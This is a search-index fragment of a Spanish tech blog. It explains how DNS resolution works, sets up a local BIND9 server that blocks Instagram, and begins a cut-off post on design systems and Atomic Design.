</ul>","tags":["DNS","Redes","Seguridad","Rendimiento","Home Lab","Administraci\u00f3n de Servidores"]},{"location":"es/blog/posts/26-01-2025/#servidores-dns-raiz-el-punto-de-partida","title":"Servidores DNS Ra\u00edz (El Punto de Partida)","text":"<ul> <li>Si el servidor DNS recursivo no tiene todav\u00eda la direcci\u00f3n IP en cach\u00e9, contacta con uno de los 13 servidores DNS ra\u00edz que est\u00e1n distribuidos globalmente.</li> <li>Estos servidores no almacenan mapeos espec\u00edficos de dominio a IP, sino que apuntan al siguiente nivel en la jerarqu\u00eda: Servidores de Dominio de Nivel Superior (TLD).</li> </ul>","tags":["DNS","Redes","Seguridad","Rendimiento","Home Lab","Administraci\u00f3n de Servidores"]},{"location":"es/blog/posts/26-01-2025/#top-level-domain-tld-servers","title":"Top-Level Domain (TLD) Servers","text":"<ul> <li>Los servidores TLD gestionan los dominios en funci\u00f3n de su sufijo, como <code>.com</code>, <code>.org</code>, o <code>.net</code>. Por ejemplo, si est\u00e1s visitando <code>google.com</code>, el servidor ra\u00edz dirigir\u00e1 su consulta al servidor TLD <code>.com</code>.</li> <li>El servidor TLD proporciona entonces la direcci\u00f3n del servidor de nombres autoritativo para el dominio solicitado.</li> </ul>","tags":["DNS","Redes","Seguridad","Rendimiento","Home Lab","Administraci\u00f3n de Servidores"]},{"location":"es/blog/posts/26-01-2025/#servidores-de-nombres-autoritativo","title":"Servidores de Nombres Autoritativo","text":"<ul> <li>El servidor de nombres autoritativo es el \u00faltimo paso de la cadena. Contiene los registros DNS reales para el dominio, incluyendo la direcci\u00f3n IP del servidor web.</li> <li>En el caso de Google, si buscas <code>google.com</code>, el servidor autorizado devolver\u00e1 la direcci\u00f3n IP correspondiente (por ejemplo, <code>8.8.8.8</code>).</li> </ul>","tags":["DNS","Redes","Seguridad","Rendimiento","Home Lab","Administraci\u00f3n de Servidores"]},{"location":"es/blog/posts/26-01-2025/#devolucion-de-la-respuesta","title":"Devoluci\u00f3n de la Respuesta","text":"<ul> <li>Una vez que el servidor DNS recursivo consigue la direcci\u00f3n IP del servidor autoritativo, la devuelve a tu navegador. Entonces, tu navegador puede utilizar la direcci\u00f3n IP para conectarse al servidor web y cargar la p\u00e1gina.</li> </ul>","tags":["DNS","Redes","Seguridad","Rendimiento","Home Lab","Administraci\u00f3n de Servidores"]},{"location":"es/blog/posts/26-01-2025/#tipos-de-consultas-dns","title":"Tipos de Consultas DNS","text":"<p>Durante este proceso, hay tres tipos principales de consultas DNS:</p> <ol> <li>Consultas Recursivas: El servidor DNS recursivo asume toda la responsabilidad de encontrar la direcci\u00f3n IP y devolv\u00e9rsela al cliente.</li> <li>Consultas Iterativas: El servidor DNS recursivo consulta cada servidor DNS en secuencia, recibiendo referencias al siguiente servidor hasta que encuentra la direcci\u00f3n IP.</li> <li>Consultas No Recursivas: Si el servidor DNS recursivo ya tiene la informaci\u00f3n en cach\u00e9, devuelve inmediatamente el resultado.</li> </ol>","tags":["DNS","Redes","Seguridad","Rendimiento","Home Lab","Administraci\u00f3n de Servidores"]},{"location":"es/blog/posts/26-01-2025/#registros-dns-componentes-basicos","title":"Registros DNS: Componentes B\u00e1sicos","text":"<p>El servidor de nombres autoritativo almacena los diferentes tipos de registros DNS que contienen informaci\u00f3n espec\u00edfica acerca del dominio. Algunos de los registros m\u00e1s comunes son: - Registro A: Asigna un dominio a una direcci\u00f3n IPv4. - Registro AAAA: Asigna un dominio a una direcci\u00f3n IPv6. - Registro CNAME: Apunta un dominio a otro (utilizado para alias). - Registro MX: Especifica los servidores de correo para la entrega de correo electr\u00f3nico. - Registro TXT: Proporciona informaci\u00f3n adicional sobre un dominio, a menudo utilizado para verificaci\u00f3n.</p>","tags":["DNS","Redes","Seguridad","Rendimiento","Home Lab","Administraci\u00f3n de Servidores"]},{"location":"es/blog/posts/26-01-2025/#cache-dns-acelerando-las-cosas","title":"Cach\u00e9 DNS: Acelerando las cosas","text":"<p>Para mejorar el rendimiento y reducir la carga de los servidores DNS, se utiliza el almacenamiento en cach\u00e9 a varios niveles:</p> <ul> <li>Cach\u00e9 del navegador: Tu navegador almacena temporalmente las respuestas DNS de los dominios que visitas con frecuencia.</li> <li>Cach\u00e9 del Sistema Operativo: El sistema operativo de tu dispositivo tambi\u00e9n almacena en cach\u00e9 las respuestas DNS para evitar consultas redundantes.</li> <li>Cach\u00e9 del servidor DNS recursivo: El servidor DNS recursivo mantiene una cach\u00e9 de los dominios consultados recientemente para acelerar futuras b\u00fasquedas.</li> </ul> <p>El almacenamiento en cach\u00e9 garantiza que la mayor\u00eda de las consultas DNS no tengan que atravesar toda la jerarqu\u00eda, haciendo que la b\u00fasqueda en Internet sea m\u00e1s r\u00e1pida y eficiente.</p> <p>Para observar c\u00f3mo el almacenamiento en cach\u00e9 de DNS reduce el tiempo de respuesta, vamos a utilizar el comando dig prestando atenci\u00f3n al Query Time para el dominio google:</p> <p>En la primera prueba obtuvimos:</p> <pre><code>; &lt;&lt;&gt;&gt; DiG 9.18.28-1~deb12u2-Debian &lt;&lt;&gt;&gt; google.com\n;; global options: +cmd\n;; Got answer:\n;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 25335\n;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1\n\n;; OPT PSEUDOSECTION:\n; EDNS: version: 0, flags:; udp: 1232\n;; QUESTION SECTION:\n;google.com.                    IN      A\n\n;; ANSWER SECTION:\ngoogle.com.             215     IN      A       142.250.200.142\n\n;; Query time: 68 msec\n</code></pre> <p>Y en la segunda prueba:</p> <pre><code>; &lt;&lt;&gt;&gt; DiG 9.18.28-1~deb12u2-Debian &lt;&lt;&gt;&gt; google.com\n;; global options: +cmd\n;; Got answer:\n;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 44597\n;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1\n\n;; OPT PSEUDOSECTION:\n; EDNS: version: 0, flags:; udp: 1232\n;; QUESTION SECTION:\n;google.com.                    IN      A\n\n;; ANSWER SECTION:\ngoogle.com.             287     IN      A       142.250.200.78\n\n;; Query time: 36 msec\n</code></pre> <p>Como podemos ver, el tiempo ha decrementado.</p>","tags":["DNS","Redes","Seguridad","Rendimiento","Home Lab","Administraci\u00f3n de Servidores"]},{"location":"es/blog/posts/26-01-2025/#seguridad-del-dns","title":"Seguridad del DNS","text":"<p>A pesar de su importancia, el sistema DNS tiene vulnerabilidades que pueden ser explotadas por los atacantes. Algunos problemas comunes incluyen:</p> <ul> <li>DNS Spoofing/Poisoning: Los actores maliciosos inyectan registros DNS falsos en la cach\u00e9, redirigiendo a los usuarios a p\u00e1ginas web fraudulentas.</li> <li>Ataques DDoS: Este es uno de los ataques m\u00e1s conocidos que consiste en inundar el servidor DNS con tr\u00e1fico para interrumpir el servicio.</li> <li>Ataques Man-in-the-Middle: Consiste en interceptar consultas DNS para modificar sus respuestas.</li> </ul> <p>Para combatir estas amenazas, tecnolog\u00edas como DNSSEC (Domain Name System Security Extensions) a\u00f1ade firmas criptogr\u00e1ficas a los registros DNS, garantizando su autenticidad. Imagina que quieres visitar google.com:</p> <ol> <li>Tu navegador solicita la direcci\u00f3n IP para google.com desde el servidor DNS recursivo.</li> <li>El servidor DNS recursivo comprueba las firmas DNSSEC en cada nivel (root, .com, and google.com).</li> <li>Si todas las firmas son v\u00e1lidas, el servidor DNS recursivo devuelve la direcci\u00f3n IP.</li> <li>Si alguna de las firmas falla, el servidor DNS recursivo sabe que los datos han sido manipulados y los descarta.</li> </ol>","tags":["DNS","Redes","Seguridad","Rendimiento","Home Lab","Administraci\u00f3n de Servidores"]},{"location":"es/blog/posts/26-01-2025/#configurar-un-servidor-dns-local-por-motivos-de-privacidad-y-rendimiento","title":"Configurar un servidor DNS local por motivos de Privacidad y Rendimiento","text":"<p>Si has llegado hasta aqu\u00ed, \u00a1enhorabuena! Ya conoces los principios b\u00e1sicos y claves de los servidores DNS. Con este conocimiento, est\u00e1s preparado para ponerte manos a la obra y configurar tu propio servidor DNS local. Hacerlo te abre un mundo de posibilidades: puedes filtrar contenido no deseado en tu red, mejorar el rendimiento de la navegaci\u00f3n e incluso navegar por internet de manera segura, minimizando el riesgo de virus y otras amenazas online.</p>","tags":["DNS","Redes","Seguridad","Rendimiento","Home Lab","Administraci\u00f3n de Servidores"]},{"location":"es/blog/posts/26-01-2025/#bind9","title":"Bind9","text":"<p>En este articulo, utilizaremos el servidor DNS BIND9 para configurar un servidor DNS directamente en nuestro ordenador. Este enfoque pr\u00e1ctico nos permitir\u00e1 experimentar c\u00f3mo es tener un servidor DNS completamente funcional ejecut\u00e1ndose en nuestra propia red, \u00a1desde la comodidad de nuestra propia m\u00e1quina!</p> <p>Primero, vamos a instalar bind9:</p> <pre><code>sudo apt update\nsudo apt install bind9 dnsutils\n</code></pre> <p>Configuramos nuestro sistema para que primero pregunte al servidor DNS local que nos hemos instalado:</p> <pre><code>sudo nano /etc/resolv.conf\n</code></pre> <p>A\u00f1adimos el servidor local como primera l\u00ednea:</p> <pre><code>nameserver 127.0.0.1\n</code></pre> <p>Despu\u00e9s, editaremos el archivo de configuraci\u00f3n:</p> <pre><code>sudo nano /etc/bind/named.conf.options\n</code></pre> <p>Elimina todo lo que contiene dicho archivo y a\u00f1ade lo siguiente:</p> <pre><code>acl \"trusted\" {\n    192.168.0.0/16;\n    localhost;\n};\n\noptions {\n    directory \"/var/cache/bind\";\n\n    recursion yes;\n    allow-query { trusted; };\n\n    forwarders {\n        1.1.1.3;\n        1.1.1.2;\n    };\n\n    dnssec-validation auto;\n\n    listen-on { any; };\n    listen-on-v6 { any; };\n};\n</code></pre> <p>Esta ACL especifica qu\u00e9 clientes son considerados \"de confianza\" y pueden interactuar con el servidor DNS.</p> <p>El bloque de opciones contiene ajustes globales para el servidor BIND9. Vamos a repasar cada l\u00ednea:</p> <ul> <li> <p><code>directory \"/var/cache/bind\";</code> Especifica el directorio donde BIND almacenar\u00e1 su cach\u00e9 y archivos relacionados.</p> </li> <li> <p><code>recursion yes;</code> Habilita las consultas recursivas, lo que significa que el servidor resolver\u00e1 las consultas DNS en nombre de los clientes consultado otros servidores DNS si no tiene la respuesta en cach\u00e9 o localmente configurada.</p> </li> <li> <p><code>allow-query { trusted; };</code> Restringe qu\u00e9 clientes pueden enviar consultas al servidor. Solo los clientes definidos en la ACL de confianza (red local y localhost) pueden realizar consultas al servidor DNS.</p> </li> <li> <p><code>forwarders { 1.1.1.3; 1.1.1.2; };</code> Define los servidores DNS externos (en este caso, los servidores DNS filtrados de Cloudflare) a los que el servidor reenviar\u00e1 las consultas que no puede resolver localmente. El servidor act\u00faa como un intermediario, reenviando consultas no resueltas a estos servidores upstream.</p> <ul> <li>1.1.1.3: Bloquea el contenido malicioso.</li> <li>1.1.1.2: Bloquea contenido relacionado con malware.</li> </ul> </li> <li> <p><code>dnssec-validation auto;</code> Habilita la validaci\u00f3n DNSSEC autom\u00e1ticamente, garantizando la autenticidad y la integridad de las respuestas del DNS usando firmas criptogr\u00e1ficas.</p> </li> </ul> <p>Con esta configuraci\u00f3n, hemos implementado medidas b\u00e1sicas de seguridad confiando en los servidores DNS de Cloudflare para gestionar las consultas reenviadas, garantizando que las respuestas est\u00e1n filtradas para evitar dominios maliciosos.</p> <p>Podemos comprobar nuestra mejora de rendimiento haciendo lo mismo que antes, utilizando el comando dig para buscar el Query Time del dominio google.com.</p> <pre><code>; &lt;&lt;&gt;&gt; DiG 9.18.28-1~deb12u2-Debian &lt;&lt;&gt;&gt; google.com\n;; global options: +cmd\n;; Got answer:\n;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 56385\n;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1\n\n;; OPT PSEUDOSECTION:\n; EDNS: version: 0, flags:; udp: 1232\n; COOKIE: 2b2a789af74949000100000067966b06329ed55c149fd975 (good)\n;; QUESTION SECTION:\n;google.com.                    IN      A\n\n;; ANSWER SECTION:\ngoogle.com.             300     IN      A       142.250.200.142\n\n;; Query time: 67 msec\n;; SERVER: 127.0.0.1#53(127.0.0.1) (UDP)\n;; MSG SIZE  rcvd: 83\n</code></pre> <p>Despu\u00e9s de la segunda consulta, conseguimos un tiempo de respuesta de 0ms, ya que nuestro servidor DNS local recupera eficazmente el resultado de su cach\u00e9.</p> <pre><code>; &lt;&lt;&gt;&gt; DiG 9.18.28-1~deb12u2-Debian &lt;&lt;&gt;&gt; google.com\n;; global options: +cmd\n;; Got answer:\n;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 51691\n;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1\n\n;; OPT PSEUDOSECTION:\n; EDNS: version: 0, flags:; udp: 1232\n; COOKIE: a2419e6c5e03859d0100000067966b096b0ad0c0a30e2273 (good)\n;; QUESTION SECTION:\n;google.com.                    IN      A\n\n;; ANSWER SECTION:\ngoogle.com.             297     IN      A       142.250.200.142\n\n;; Query time: 0 msec\n;; SERVER: 127.0.0.1#53(127.0.0.1) (UDP)\n;; MSG SIZE  rcvd: 83\n</code></pre> <p>Podemos ver que el SERVER al que estamos preguntando es <code>127.0.0.1</code>ya que es nuestro servidor DNS bind9.</p> <p>Sin embargo, \u00bfy si queremos ir un paso m\u00e1s all\u00e1 y aplicar nuestras propias restricciones? Ya sea para mejorar la seguridad, bloquear sitios webs espec\u00edficos o crear un entorno de Internet m\u00e1s seguro para los ni\u00f1os, podemos configurar BIND9 para restringir el acceso a una lista personalizada de dominios. Esto nos da un control total sobre qu\u00e9 contenido est\u00e1 o no permitido en nuestra red, adaptando el servidor DNS para satisfacer nuestras necesidades espec\u00edficas.</p>","tags":["DNS","Redes","Seguridad","Rendimiento","Home Lab","Administraci\u00f3n de Servidores"]},{"location":"es/blog/posts/26-01-2025/#bloqueo-de-dominios-especificos-usando-bind9","title":"Bloqueo de dominios espec\u00edficos usando BIND9","text":"<p>Para bloquear dominios espec\u00edficos utilizando BIND9, podemos crear un archivo de zona personalizado que redirigir\u00e1 las consultas de aquellos dominios a una direcci\u00f3n no v\u00e1lida o inexistente, bloqueando as\u00ed el acceso. </p> <p>Aqu\u00ed tienes una gu\u00eda paso a paso:</p>","tags":["DNS","Redes","Seguridad","Rendimiento","Home Lab","Administraci\u00f3n de Servidores"]},{"location":"es/blog/posts/26-01-2025/#crear-un-archivo-de-zona-para-bloquear-dominios","title":"Crear un archivo de Zona para bloquear dominios","text":"<p>Un archivo de zona define los registros DNS para los dominios que quieras bloquear. Estos registros pueden redirigir los dominios bloqueados a un &lt;&lt;agujero negro&gt;&gt; (por ejemplo, <code>127.0.0.1</code> o <code>0.0.0.0</code>).</p> <ol> <li> <p>Cree un archivo de zona para los dominios bloqueados, por ejemplo, <code>block_instagram.zone</code>:   <pre><code>sudo nano /etc/bind/block_instagram.zone\n</code></pre></p> </li> <li> <p>A\u00f1ade lo siguiente al contenido del archivo de zona:   <pre><code>$TTL    3600\n@       IN      SOA     localhost. root.localhost. (\n                2025012601 ; Serial\n                3600       ; Refresh\n                1800       ; Retry\n                604800     ; Expire\n                86400 )    ; Minimum TTL\n        IN      NS      localhost.\n\n@       IN      A       127.0.0.1\n*       IN      A       127.0.0.1\n</code></pre></p> <ul> <li><code>127.0.0.1</code>: Redirige las consultas de los dominios bloqueados a la m\u00e1quina local, impidiendo efectivamente el acceso.</li> <li>Registro Comod\u00edn (<code>* IN A</code>): Garantiza que cualquier subdominio de los dominios bloqueados tambi\u00e9n sean redirigidos.</li> </ul> </li> </ol>","tags":["DNS","Redes","Seguridad","Rendimiento","Home Lab","Administraci\u00f3n de Servidores"]},{"location":"es/blog/posts/26-01-2025/#defina-los-dominios-bloqueados-en-namedconflocal","title":"Defina los Dominios Bloqueados en <code>named.conf.local</code>","text":"<p>Vamos a bloquear Instagram. Es necesario asociar el dominio bloqueado con el archivo de zona personalizado.</p> <ol> <li>Abre el archivo de configuraci\u00f3n de BIND9 <pre><code>sudo nano /etc/bind/named.conf.local\n</code></pre></li> <li>A\u00f1ade una entrada <code>zone</code> a cada dominio que quieras bloquear. En este caso bloquearemos instagram.com y cdninstagram.com, el dominio de la red de la distribuci\u00f3n de contenidos (CDN) de Instagram que se utiliza para servir im\u00e1genes y videos: <pre><code>zone \"instagram.com\" {\n    type master;\n    file \"/etc/bind/block_instagram.zone\";\n};\n\nzone \"cdninstagram.com\" {\n    type master;\n    file \"/etc/bind/block_instagram.zone\";\n};\n</code></pre></li> </ol>","tags":["DNS","Redes","Seguridad","Rendimiento","Home Lab","Administraci\u00f3n de Servidores"]},{"location":"es/blog/posts/26-01-2025/#recargar-la-configuracion-de-bind9","title":"Recargar la Configuraci\u00f3n de BIND9","text":"<p>Una vez que hayas creado el archivo de zona y actualizado la configuraci\u00f3n, recarga el servicio BIND9 para aplicar los cambios.</p> <ol> <li> <p>Comprueba si hay errores en la configuraci\u00f3n: <pre><code>sudo named-checkconf\n</code></pre></p> </li> <li> <p>Recarga el servicio BIND9: <pre><code>sudo systemctl reload bind9\n</code></pre></p> </li> </ol>","tags":["DNS","Redes","Seguridad","Rendimiento","Home Lab","Administraci\u00f3n de Servidores"]},{"location":"es/blog/posts/26-01-2025/#prueba-la-configuracion","title":"Prueba la Configuraci\u00f3n","text":"<p>Para verificar que los dominios bloqueados funcionan como se espera:</p> <ol> <li> <p>Utiliza el comando <code>dig</code> para consultar el dominio bloqueado: <pre><code>dig instagram.com.\n</code></pre></p> <ul> <li>La respuesta deber\u00eda de devolver <code>127.0.0.1</code>.</li> </ul> </li> <li> <p>Intente acceder al dominio bloqueado desde el navegador. No deber\u00eda de cargarse.</p> </li> </ol> Instagram no est\u00e1 Disponible <p>Al crear un archivo de zona personalizado y asociarlo a los dominios que deseas bloquear, obtenemos un control total sobre las restricci\u00f3n de acceso a ciertos sitios web. Esta configuraci\u00f3n nos permite:</p> <ul> <li>Mejorar la seguridad bloqueando dominios maliciosos conocidos.</li> <li>Personalizar el servidor DNS para satisfacer los requisitos espec\u00edficos de la red.</li> </ul>","tags":["DNS","Redes","Seguridad","Rendimiento","Home Lab","Administraci\u00f3n de Servidores"]},{"location":"es/blog/posts/26-01-2025/#conclusion","title":"Conclusion","text":"<p>Ahora, ya sabes como bloquear cualquier dominio al que no quieras que accedan tus familiares o los usuarios de la red. Ya sea para limitar el acceso a las redes sociales para ayudar a tus hijos a concentrarse, para mejorar la seguridad bloqueando sitios web maliciosos o simplemente para tener control de tu propia red, ahora tienes las herramientas para conseguirlo.</p> <p>Este ejemplo se realiz\u00f3 en un port\u00e1til local, pero no tiene porque detenerse ah\u00ed. Puedes implementar la misma configuraci\u00f3n a nivel de router o usar una Raspberry Pi como tu servidor DNS primario. De esta manera, puedes aplicar estas reglas a toda tu red, garantizando que todos los dispositivos conectados siguen tus restricciones personalizadas.</p> <p>Con este enfoque, no solo est\u00e1s gestionando un servidor DNS, est\u00e1s creando un entorno digital m\u00e1s seguro y productivo para todos los miembros de tu red.</p> <p>Stay safe. Stay smart. Stay secure.</p>","tags":["DNS","Redes","Seguridad","Rendimiento","Home Lab","Administraci\u00f3n de Servidores"]},{"location":"es/blog/posts/27-04-2025/","title":"Design Systems: Creando Consistencia Visual a Trav\u00e9s de Productos","text":"<p>Imagina que est\u00e1s trabajando como dise\u00f1ador de una empresa, encargado de llevar el dise\u00f1o de m\u00faltiples microservicios. El primero te sale muy bien, sin embargo, a la hora de hacer el segundo, notas que no hay mucha coherencia con el primero y que aunque se parecen, tienen algo que no hace que parezcan de la misma empresa. Se usan diferentes fuentes, espaciados, estilos, colores, iconograf\u00eda...</p> <p>Una vez terminados los dise\u00f1os, el cliente te felicita, ya que le ha gustado, sin embargo, al tiempo te escribe, y te dice que si bien ha habido una mejor\u00eda con respecto a lo anterior, los microservicios no estaban cohesionados, no hab\u00eda una correlaci\u00f3n entre unos y otros, en definitiva, parec\u00edan piezas independientes unas de otras, no un ecosistema de la empresa.</p> <p>Resulta que, frente a esta retroalimentaci\u00f3n, te invade cierta frustraci\u00f3n. Despu\u00e9s de todo el esfuerzo invertido, sigue habiendo problemas de coherencia visual. Decidido a resolver este desaf\u00edo de una vez por todas, comienzas a investigar y das con una revelaci\u00f3n: un t\u00e9rmino del que nunca hab\u00edas o\u00eddo hablar antes, los Design Systems.</p>"},{"location":"es/blog/posts/27-04-2025/#design-system","title":"\u00bfDesign system?","text":"<p>A la hora de explicar qu\u00e9 es un Design System, me gusta hacer una analog\u00eda con los legos. Al igual que estas famosas piezas de construcci\u00f3n nos permiten crear estructuras \u00fanicas e incre\u00edbles, un Design System nos proporciona elementos b\u00e1sicos para construir interfaces digitales. Estos elementos, llamados componentes, son como las piezas de LEGO: reutilizables (se pueden usar en m\u00faltiples lugares) y modulares (funcionan de manera independiente pero se integran perfectamente con otros). Y as\u00ed como LEGO tiene series tem\u00e1ticas (Star Wars, Harry Potter, City) donde todas las piezas comparten una est\u00e9tica coherente y combinan perfectamente entre s\u00ed, un Design System garantiza que todos sus elementos \"pertenecen a la misma familia\" visualmente.</p> <p></p> <p>Entrando m\u00e1s en tecnicismos y dejando las analog\u00edas a un lado, un Design System es una colecci\u00f3n de componentes reutilizables, guiados por principios claros, documentados y estandarizados que permiten a los equipos crear dise\u00f1os de manera coherente, consistente y eficiente. Adem\u00e1s, establece un \"lenguaje com\u00fan\" de dise\u00f1o que facilita enormemente la comunicaci\u00f3n entre equipos de dise\u00f1o, desarrollo y producto.</p> <p>Ahora que comprendemos qu\u00e9 es un Design System y su importancia para mantener la consistencia visual, surge la pregunta pr\u00e1ctica: \u00bfc\u00f3mo implementarlo? Crear un sistema completo desde cero puede parecer abrumador, especialmente si no contamos con una estructura clara que gu\u00ede el proceso. Afortunadamente, existen metodolog\u00edas probadas que nos ofrecen un camino definido. Entre ellas destaca una aproximaci\u00f3n que, inspirada en principios cient\u00edficos, nos permite construir sistemas complejos a partir de elementos simples.</p>"},{"location":"es/blog/posts/27-04-2025/#atomic-design","title":"Atomic Design","text":"<p>La metodolog\u00eda Atomic Design, creada por Brad Frost, es una de las formas m\u00e1s populares y efectivas de estructurar un Design System. Esta metodolog\u00eda toma inspiraci\u00f3n de la qu\u00edmica para organizar los componentes de interfaz de forma jer\u00e1rquica, desde los m\u00e1s simples hasta los m\u00e1s complejos. </p>"},{"location":"es/blog/posts/27-04-2025/#iones-design-tokens","title":"Iones (Design Tokens)","text":"<p>Los iones son los elementos m\u00e1s fundamentales y abstractos del sistema. Al igual que en qu\u00edmica los iones son part\u00edculas cargadas que forman parte de los \u00e1tomos, en dise\u00f1o representan las propiedades b\u00e1sicas y variables que definir\u00e1n todo el sistema:</p> <ul> <li>Colores (paletas primarias, secundarias, neutros)</li> <li>Tipograf\u00eda (familias, tama\u00f1os, pesos)</li> <li>Espaciado (sistema de grid, m\u00e1rgenes, paddings)</li> <li>Sombras y elevaciones</li> <li>Bordes y radios</li> <li>Opacidades</li> <li>Transiciones y animaciones</li> </ul>"},{"location":"es/blog/posts/27-04-2025/#algunos-ejemplos","title":"Algunos ejemplos","text":"<p>Estos elementos, tambi\u00e9n conocidos como \"Design Tokens\", no tienen funcionalidad por s\u00ed mismos, pero son cruciales ya que definen la identidad visual del sistema y afectan a todos los dem\u00e1s componentes. Son las propiedades fundamentales que, como variables, pueden modificarse para alterar todo el aspecto del sistema sin cambiar su estructura.</p>"},{"location":"es/blog/posts/27-04-2025/#atomos","title":"\u00c1tomos","text":"<p>Los \u00e1tomos son los componentes m\u00e1s b\u00e1sicos e indivisibles de un Design System. Al igual que los \u00e1tomos en la qu\u00edmica son los bloques fundamentales de la materia, en dise\u00f1o representan los elementos m\u00e1s simples de una interfaz:</p> <ul> <li>Botones</li> <li>Campos de texto</li> <li>Iconos</li> <li>Etiquetas</li> <li>Checkboxes</li> <li>Selectores simples</li> <li>Avatares</li> </ul> <p>Estos elementos pueden implementarse de forma independiente y tienen una funci\u00f3n espec\u00edfica, pero no pueden descomponerse m\u00e1s sin perder dicha funci\u00f3n. Un bot\u00f3n, por ejemplo, aplica propiedades ioniales (colores, tipograf\u00eda, espaciado), pero constituye una unidad funcional indivisible.</p> <p></p>"},{"location":"es/blog/posts/27-04-2025/#moleculas","title":"Mol\u00e9culas","text":"<p>Las mol\u00e9culas se forman cuando dos o m\u00e1s \u00e1tomos se unen para crear componentes con funcionalidades espec\u00edficas. Algunos ejemplos ser\u00edan:</p> <ul> <li>Un campo de b\u00fasqueda (combina un campo de texto, un bot\u00f3n y un icono)</li> <li>Un grupo de selecci\u00f3n (radio buttons con sus etiquetas)</li> <li>Una tarjeta simple (combina t\u00edtulo, descripci\u00f3n y posiblemente una imagen)</li> </ul> <p>Las mol\u00e9culas son relativamente simples y se centran en hacer una cosa bien, pero ya proporcionan una funcionalidad tangible para el usuario. </p>"},{"location":"es/blog/posts/27-04-2025/#organismos","title":"Organismos","text":"<p>Los organismos son componentes m\u00e1s complejos formados por la combinaci\u00f3n de mol\u00e9culas y/o \u00e1tomos. Representan secciones distintivas de una interfaz:</p> <ul> <li>Una barra de navegaci\u00f3n completa (logo, men\u00fa, buscador, botones de cuenta)</li> <li>Un formulario de registro (campos, validaciones, botones de env\u00edo)</li> <li>Un carrusel de productos (con tarjetas de producto, controles de navegaci\u00f3n)</li> <li>Un pie de p\u00e1gina con m\u00faltiples columnas de informaci\u00f3n</li> </ul> <p>Los organismos son componentes lo suficientemente complejos como para constituir secciones completas de una interfaz. </p>"},{"location":"es/blog/posts/27-04-2025/#plantillas","title":"Plantillas","text":"<p>Las plantillas son esquemas de p\u00e1ginas que muestran c\u00f3mo se organizan los organismos en un dise\u00f1o coherente. No contienen contenido real sino que definen la estructura y el layout:</p> <ul> <li>Template de p\u00e1gina de inicio</li> <li>Template de p\u00e1gina de producto</li> <li>Template de formulario de contacto</li> <li>Template de blog</li> </ul> <p>Las plantillas act\u00faan como un wireframe de alta fidelidad, mostrando la distribuci\u00f3n de los elementos en cada tipo de p\u00e1gina.</p>"},{"location":"es/blog/posts/27-04-2025/#paginas","title":"P\u00e1ginas","text":"<p>Las p\u00e1ginas son instancias espec\u00edficas de plantillas que muestran c\u00f3mo se ver\u00eda la interfaz con contenido real:</p> <ul> <li>La p\u00e1gina de inicio actual con promociones de temporada</li> <li>Una p\u00e1gina de producto espec\u00edfico con sus im\u00e1genes y descripciones</li> <li>Un art\u00edculo de blog concreto con su contenido</li> </ul> <p>Las p\u00e1ginas son la manifestaci\u00f3n final de todo el sistema y permiten probar c\u00f3mo funciona el Design System en escenarios reales.</p> <p></p>"},{"location":"es/blog/posts/27-04-2025/#por-que-usar-atomic-design","title":"\u00bfPor qu\u00e9 usar Atomic Design?","text":"<ul> <li>Modularidad: Permite crear, probar y mantener componentes de forma independiente.</li> <li>Escalabilidad: Facilita la adici\u00f3n de nuevos componentes sin romper los existentes.</li> <li>Consistencia: Garantiza que los mismos componentes se utilicen en toda la interfaz.</li> <li>Eficiencia: Reduce la duplicaci\u00f3n de trabajo al reutilizar componentes.</li> <li>Colaboraci\u00f3n: Proporciona un lenguaje com\u00fan para dise\u00f1adores y desarrolladores.</li> </ul> <p>Si quer\u00e1is profundizar m\u00e1s en esta metodolog\u00eda, este libro lo cuenta a la perfecci\u00f3n y es del que me ha basado (entre otros): Atomic Design</p> <p>La metodolog\u00eda Atomic Design nos proporciona un marco estructurado para organizar los componentes de nuestro Design System, desde los elementos m\u00e1s simples hasta las p\u00e1ginas completas. Esta aproximaci\u00f3n sistem\u00e1tica no solo facilita la creaci\u00f3n y mantenimiento de interfaces coherentes, sino que tambi\u00e9n refleja muchas de las ventajas inherentes a la implementaci\u00f3n de un Design System. Sin embargo, como toda soluci\u00f3n, adoptar un Design System conlleva tanto beneficios significativos como ciertos desaf\u00edos que debemos considerar. Entender estas implicaciones nos ayudar\u00e1 a evaluar si esta inversi\u00f3n es adecuada para nuestro contexto espec\u00edfico y c\u00f3mo podemos maximizar su valor mientras mitigamos sus potenciales inconvenientes.</p>"},{"location":"es/blog/posts/27-04-2025/#beneficios-y-contras-de-los-design-systems","title":"Beneficios y Contras de los Design Systems","text":"<p>La implementaci\u00f3n de un Design System es una decisi\u00f3n estrat\u00e9gica que puede transformar profundamente la forma en que una organizaci\u00f3n aborda el dise\u00f1o digital. Como cualquier estrategia, es importante sentarnos a analizar los pros y los contras de cada una de las posibles soluciones antes de tomar una decisi\u00f3n.</p>"},{"location":"es/blog/posts/27-04-2025/#beneficios-de-implementar-un-design-system","title":"Beneficios de implementar un Design System","text":""},{"location":"es/blog/posts/27-04-2025/#consistencia-y-coherencia-visual","title":"Consistencia y coherencia visual","text":"<p>Quiz\u00e1s el beneficio m\u00e1s evidente y el motivo principal por el que comenzamos esta conversaci\u00f3n: un Design System garantiza que todos los productos digitales de una empresa mantengan una apariencia y comportamiento coherentes. Los usuarios perciben una experiencia unificada independientemente del producto o servicio que est\u00e9n utilizando, fortaleciendo as\u00ed la identidad de marca.</p>"},{"location":"es/blog/posts/27-04-2025/#eficiencia-en-el-desarrollo","title":"Eficiencia en el desarrollo","text":"<p>Al contar con componentes predefinidos y reutilizables, los equipos de desarrollo pueden implementar nuevas funcionalidades o productos completos en mucho menos tiempo. No es necesario \"reinventar la rueda\" cada vez que se crea una nueva interfaz, lo que reduce significativamente los tiempos de entrega.</p>"},{"location":"es/blog/posts/27-04-2025/#mejora-en-la-colaboracion-entre-equipos","title":"Mejora en la colaboraci\u00f3n entre equipos","text":"<p>Un Design System establece un vocabulario com\u00fan entre dise\u00f1adores, desarrolladores y stakeholders. Esta 